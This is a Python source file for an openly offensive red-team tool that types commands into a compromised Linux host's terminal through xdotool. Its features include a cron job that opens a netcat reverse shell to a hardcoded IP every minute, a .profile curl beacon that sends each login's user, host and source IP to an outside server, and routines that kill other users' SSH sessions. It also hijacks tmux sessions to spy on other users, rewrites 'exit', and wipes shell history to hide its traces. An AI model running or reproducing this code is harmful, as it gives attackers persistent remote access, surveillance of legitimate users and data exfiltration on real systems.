import argparse
import sys
import subprocess
from time import sleep
import pyautogui
import os
my_ip = "136.243.108.184"
# Define command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--bs", action='store_true', help="beautiful shell" )
parser.add_argument("--kick", help="Kick other pts sessions, use -1 to kick all other sessions, specify the number you want to kick example pts/2 execute --kick 2", type=int, default=-2)
parser.add_argument("--ts", action='store_true', help="tmux setup, make every login start a tmux session by default", )
parser.add_argument("--ats", action='store_true', help="Attach to latest tmux session, watch other people :D", )
parser.add_argument("--ic", help="Install crontab, to automatically connect to your ip, IP hardcoded in script, port needs to be specified", type=str , default=-1)
parser.add_argument("--armageddon", help="[user@host] Connect, install tmux, kick all, listen for tmux session and connect", type=str , default=-1)
parser.add_argument("--wft", action='store_true', help="Waiting for temux session to connect", )
parser.add_argument("--ch", action='store_true', help="Clear the history", )
parser.add_argument("--cab", action='store_true', help="Curl agent backend, so it registers everytime someone logs in", )
parser.add_argument("--wcs",  nargs='?',help="Wall cow say", type=str, const="muuuuhhhhhh, I am a cow")

# Parse command-line arguments
args = parser.parse_args()

def write(text):
    # use subprocess and xdotool to write text
    subprocess.run(["xdotool", "type", "--delay", "0", text])

def press(key):
    # use subprocess and xdotool to press key
    subprocess.run(["xdotool", "key", key])
# Check if command is "bs"

def kickAll():
        write("w | grep \"10.10\" | awk '{print($2)}' | grep pts > active_sessions")
        press("Return")
        write("ps -efH | grep $$ | grep bash | grep -v grep | awk '{print($6)}' > my_session")
        press("Return")
        write("grep -v -x -f my_session active_sessions | awk '{system(\"ps -efH | grep \" $1)}' | grep -v grep | awk '{system(\"kill \" $2)}'")
        press("Return")
        write("rm my_session")
        press("Return")
        write("rm active_sessions")
        press("Return")
        write("tmux kill-server")
        press("Return")
        write("history -c")
        press("Return")
        write("w")
        press("Return")
        write("history -c")
        press("Return")

def tmuxSetup(): 
    write("sudo apt install tmux -y")
    press("Return")
    sleep(3)
    write("echo 'isTmux=0' >> .profile")
    press("Return")
    write("echo 'iKnow=0' >> .profile")
    press("Return")
    write("echo 'i=0' >> .profile")
    press("Return")
    write("echo 'while [ $iKnow -lt 1 ] && [ $isTmux -lt 1 ] && [ $i -lt 3 ]' >> .profile")
    press("Return")
    write("echo 'do ' >> .profile")
    press("Return")
    write("echo '   iKnow=$(ps -efH | grep $$ -B $i | grep sshd | grep -v grep | wc -l)' >> .profile")
    press("Return")
    write("echo '   isTmux=$(ps -efH | grep $$ -B $i | grep tmux | grep -v grep | wc -l)' >> .profile")
    press("Return")
    write("echo '   i=$((i+1))' >> .profile")
    press("Return")
    write("echo 'done' >> .profile")
    press("Return")
    write("echo 'if [ $isTmux -lt 1 ] && [ $i -lt 3 ]' >> .profile")
    press("Return")
    write("echo 'then' >> .profile")
    press("Return")
    write("echo '   tmux' >> .profile")
    press("Return")
    write("echo 'fi' >> .profile && history -c")
    press("Return")
    write("echo 'checkIfRedTeamisOnline() {' >> .profile")
    press("Return")
    write("echo \"    mySession=\$(tmux display-message -a | grep client_tty | cut -d / -f3,4)\" >> .profile")
    press("Return")
    write("echo \"    ps -efH | grep \\$mySession | awk \'{system(\\\"kill \\\" \\$2)}\' && history -c\" >> .profile")
    press("Return")
    write("echo '}' >> .profile")
    press("Return")
    write("echo \"alias exit=\'checkIfRedTeamisOnline\'\" >> .profile")
    press("Return")
    write("history -c")
    press("Return")

def waitForTmux():
    write("counter=$(w | wc -l); until [ $counter -gt 3 ] && [ $(w | grep tmux | wc -l) -gt 0 ] ; do sleep 1; ((counter = $(w | wc -l))); clear; w; done && tmux attach-session -t $(tmux list-sessions | grep attached | grep -v '0 windows' | awk '{print $1}' | cut -d ':' -f 1 | tail -n 1)")
    press("Return")

def clearHistory(): 
    write("cd")
    press("Return")
    write("rm .bash_history")
    press("Return")
    write("history -c")
    press("Return")
    write("exit")
    press("Return")
    write("Please recoonect to the host now, you have 8 seconds")
    sleep(2)
    pyautogui.hotkey("ctrl", "c")
    print("Reconnect to the host please")
    sleep(8)
    kickAll()
    write("history")
    press("Return")

def wall_cow_say(text):
    write("cowsay " + text + " | wall")
    press("Return")

sleep(2)
kick_value = args.kick
if args.bs:
    write("python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && history -c")

if args.kick != -2:
    if args.kick == -1: 
        kickAll()
    elif args.kick > -1:
        write(f'ps -efH | grep pts/{kick_value}' + ' | awk \'{system("kill " $2)}\' && history -c')

if args.ts:
   #!/bin/bash
    tmuxSetup()
if args.ats:
    write("tmux attach-session -t $(tmux list-sessions | grep attached | grep -v '0 windows' | awk '{print $1}' | cut -d ':' -f 1 | tail -n 1)")
    press("Return")

if args.ic != -1:
    write("echo \"* * * * * /usr/bin/nc " + my_ip + " " + args.ic + " -e /bin/bash\" >> .crontab_d")
    press("Return")
    write("crontab .crontab_d")
    press("Return")
    write("crontab -l")
    press("Return")
    write("history -c")
    press("Return")

if args.wft:
    waitForTmux()

if args.armageddon != -1:
    ip = args.armageddon
    write(f"ssh {ip}")
    press("Return")
    sleep(8)
    tmuxSetup()
    sleep(1)
    kickAll()
    sleep(1)
    waitForTmux()

if args.ch:
    clearHistory()
if args.wcs:
    wall_cow_say(args.wcs)
if args.cab:
    write("echo \"curl -s \\\"http://112.175.50.47:3000?user=$(whoami)&host=$(hostname)&pts=\$(who -m | awk '{print(\\$2)}')&source_ip=\$(who -m | rev | cut -d \\\" \\\" -f 1 | rev | cut -d '(' -f2 | cut -d ')' -f1)\\\" > /dev/null\" >> .profile")
    press("Return")
    write("history -c")
    press("Return")

if len(sys.argv)==1:
    parser.print_help()

# solution=bash; counter=$$; until [[ $solution == *"sshd:"* ]]; do sleep 1; counter=$(ps -efH | grep $counter | head -n 1 | awk '{print($3)}'); solution=$(ps -efH | grep $counter | awk '{print($8)}'); done && echo $counter